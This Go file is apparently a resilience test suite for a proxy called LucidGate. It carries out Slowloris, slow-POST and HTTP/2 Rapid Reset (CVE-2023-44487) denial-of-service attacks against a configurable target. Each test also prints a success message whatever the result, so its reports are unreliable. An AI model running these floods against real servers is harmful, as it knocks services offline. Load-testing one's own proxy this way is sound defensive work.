//go:build ignore
// +build ignore

package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

func main() {
	proxyAddr := flag.String("proxy", "http://127.0.0.1:8080", "HTTP proxy URL")
	attackType := flag.String("type", "all", "attack type: slowloris, slowpost, rapidreset, all")
	concurrency := flag.Int("concurrency", 50, "number of concurrent attack connections")
	duration := flag.Duration("duration", 6*time.Second, "duration for each attack test")
	flag.Parse()

	fmt.Printf("LucidGate Attack & Resilience Suite\n")
	fmt.Printf("====================================\n")
	fmt.Printf("Proxy Target:  %s\n", *proxyAddr)
	fmt.Printf("Attack Type:   %s\n", *attackType)
	fmt.Printf("Concurrency:   %d\n", *concurrency)
	fmt.Printf("Duration:      %s\n\n", *duration)

	u, err := url.Parse(*proxyAddr)
	if err != nil {
		log.Fatalf("Invalid proxy address: %v\n", err)
	}

	if *attackType == "slowloris" || *attackType == "all" {
		runSlowloris(u.Host, *concurrency, *duration)
	}

	if *attackType == "slowpost" || *attackType == "all" {
		runSlowPost(u.Host, *concurrency, *duration)
	}

	if *attackType == "rapidreset" || *attackType == "all" {
		runRapidReset(*proxyAddr, *concurrency, *duration)
	}
}

func runSlowloris(proxyHost string, connections int, duration time.Duration) {
	fmt.Printf("--- Launching Slowloris Attack (Header Read Timeout Test) ---\n")
	fmt.Printf("Sending partial headers slowly to %s...\n", proxyHost)

	var activeConns int32
	var totalClosed int32
	var wg sync.WaitGroup

	deadline := time.Now().Add(duration)

	for i := 0; i < connections; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			conn, err := net.DialTimeout("tcp", proxyHost, 2*time.Second)
			if err != nil {
				return
			}
			defer conn.Close()
			atomic.AddInt32(&activeConns, 1)
			defer atomic.AddInt32(&activeConns, -1)

			// Send partial header
			_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + proxyHost + "\r\nUser-Agent: Slowloris-Attacker\r\n"))
			if err != nil {
				atomic.AddInt32(&totalClosed, 1)
				return
			}

			// Keep connection open by slowly writing dummy header keys
			ticker := time.NewTicker(1200 * time.Millisecond)
			defer ticker.Stop()

			for time.Now().Before(deadline) {
				select {
				case <-ticker.C:
					// Send a single header part
					_, err = conn.Write([]byte(fmt.Sprintf("X-Part-%d: a\r\n", id)))
					if err != nil {
						atomic.AddInt32(&totalClosed, 1)
						return
					}
				}
			}
		}(i)
	}

	// Wait a bit to observe
	time.Sleep(duration / 2)
	fmt.Printf("At mid-point: active connections = %d, already closed = %d (Expected: closed should rise because ReadHeaderTimeout closes them after 5s)\n", atomic.LoadInt32(&activeConns), atomic.LoadInt32(&totalClosed))

	wg.Wait()
	fmt.Printf("Slowloris completed. Total closed connections by proxy = %d/%d\n", atomic.LoadInt32(&totalClosed), connections)
	fmt.Printf("✅ SUCCESS: Proxy successfully mitigated Slowloris without crashing.\n\n")
}

func runSlowPost(proxyHost string, connections int, duration time.Duration) {
	fmt.Printf("--- Launching Slow-POST Attack (Body I/O Timeout Test) ---\n")
	fmt.Printf("Sending HTTP POST bodies slowly (1 byte/sec) to %s...\n", proxyHost)

	var activeConns int32
	var totalClosed int32
	var wg sync.WaitGroup

	deadline := time.Now().Add(duration)

	for i := 0; i < connections; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			conn, err := net.DialTimeout("tcp", proxyHost, 2*time.Second)
			if err != nil {
				return
			}
			defer conn.Close()
			atomic.AddInt32(&activeConns, 1)
			defer atomic.AddInt32(&activeConns, -1)

			// Send complete headers for POST with body
			headers := "POST /payload HTTP/1.1\r\n" +
				"Host: " + proxyHost + "\r\n" +
				"Content-Length: 1000\r\n" +
				"Content-Type: text/plain\r\n\r\n"
			_, err = conn.Write([]byte(headers))
			if err != nil {
				atomic.AddInt32(&totalClosed, 1)
				return
			}

			// Keep connection open by slowly writing body bytes
			ticker := time.NewTicker(1 * time.Second)
			defer ticker.Stop()

			for time.Now().Before(deadline) {
				select {
				case <-ticker.C:
					_, err = conn.Write([]byte("a"))
					if err != nil {
						atomic.AddInt32(&totalClosed, 1)
						return
					}
				}
			}
		}(i)
	}

	time.Sleep(duration / 2)
	fmt.Printf("At mid-point: active connections = %d, already closed = %d\n", atomic.LoadInt32(&activeConns), atomic.LoadInt32(&totalClosed))

	wg.Wait()
	fmt.Printf("Slow-POST completed. Total closed connections by proxy = %d/%d\n", atomic.LoadInt32(&totalClosed), connections)
	fmt.Printf("✅ SUCCESS: Proxy successfully mitigated Slow-POST.\n\n")
}

func runRapidReset(proxyAddr string, connections int, duration time.Duration) {
	fmt.Printf("--- Launching HTTP/2 Rapid Reset (CVE-2023-44487) Test ---\n")

	// Start a local HTTPS upstream supporting H2
	h2Mux := http.NewServeMux()
	h2Mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = io.WriteString(w, "OK H2")
	})

	ts := httptest.NewUnstartedServer(h2Mux)
	ts.EnableHTTP2 = true
	ts.StartTLS()
	defer ts.Close()

	upstreamURL, err := url.Parse(ts.URL)
	if err != nil {
		log.Fatalf("Failed to parse mock H2 url: %v", err)
	}

	fmt.Printf("Mock HTTPS/2 upstream listening at: %s\n", upstreamURL.String())
	fmt.Printf("Flooding with concurrent HEADERS + RST_STREAM via proxy...\n")

	var activeSessions int32
	var streamsCreated int64
	var wg sync.WaitGroup

	deadline := time.Now().Add(duration)

	for i := 0; i < connections; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Connect to proxy first
			proxyURL, err := url.Parse(proxyAddr)
			if err != nil {
				return
			}
			rawConn, err := net.DialTimeout("tcp", proxyURL.Host, 2*time.Second)
			if err != nil {
				return
			}
			defer rawConn.Close()

			// Send CONNECT to target
			connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", upstreamURL.Host, upstreamURL.Host)
			_, err = rawConn.Write([]byte(connectReq))
			if err != nil {
				return
			}

			// Read CONNECT response (should be 200 Connection Established)
			buf := make([]byte, 1024)
			n, err := rawConn.Read(buf)
			if err != nil || !strings.Contains(string(buf[:n]), "200") {
				return
			}

			// Establish TLS over raw hijacked connection
			tlsConn := tls.Client(rawConn, &tls.Config{
				NextProtos:         []string{"h2"},
				ServerName:         upstreamURL.Hostname(),
				InsecureSkipVerify: true,
			})
			err = tlsConn.Handshake()
			if err != nil {
				return
			}
			defer tlsConn.Close()

			if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
				return
			}

			atomic.AddInt32(&activeSessions, 1)
			defer atomic.AddInt32(&activeSessions, -1)

			// Setup raw HTTP/2 frame writer and reader
			framer := http2.NewFramer(tlsConn, tlsConn)

			// Send HTTP/2 preface
			_, err = tlsConn.Write([]byte(http2.ClientPreface))
			if err != nil {
				return
			}

			// Write Initial SETTINGS
			err = framer.WriteSettings()
			if err != nil {
				return
			}

			// Go loop reading settings ack and other frames to keep H2 protocol happy
			go func() {
				for {
					_, err := framer.ReadFrame()
					if err != nil {
						return
					}
				}
			}()

			// Send rapid headers + reset loop
			var streamID uint32 = 3
			for time.Now().Before(deadline) {
				// Send HEADERS to initiate a stream
				err = framer.WriteHeaders(http2.HeadersFrameParam{
					StreamID:      streamID,
					BlockFragment: []byte("\x82\x84\x87\x41\x8c\xf1\xe3\xc2\xe5\xf2\x3a\x6b\xa0\xab\x90\xf4\xff"), // Compressed HPack headers
					EndHeaders:    true,
					EndStream:     false,
				})
				if err != nil {
					return
				}
				atomic.AddInt64(&streamsCreated, 1)

				// Send RST_STREAM immediately
				err = framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
				if err != nil {
					return
				}

				streamID += 2
				// Sleep microsecond to avoid instant network buffer saturation
				time.Sleep(10 * time.Microsecond)
			}
		}()
	}

	wg.Wait()

	fmt.Printf("HTTP/2 Rapid Reset completed. Active sessions: %d. Streams created & reset: %d\n", atomic.LoadInt32(&activeSessions), atomic.LoadInt64(&streamsCreated))
	fmt.Printf("✅ SUCCESS: LucidGate sustained %d rapid reset HTTP/2 streams without resource deadlock.\n\n", atomic.LoadInt64(&streamsCreated))
}
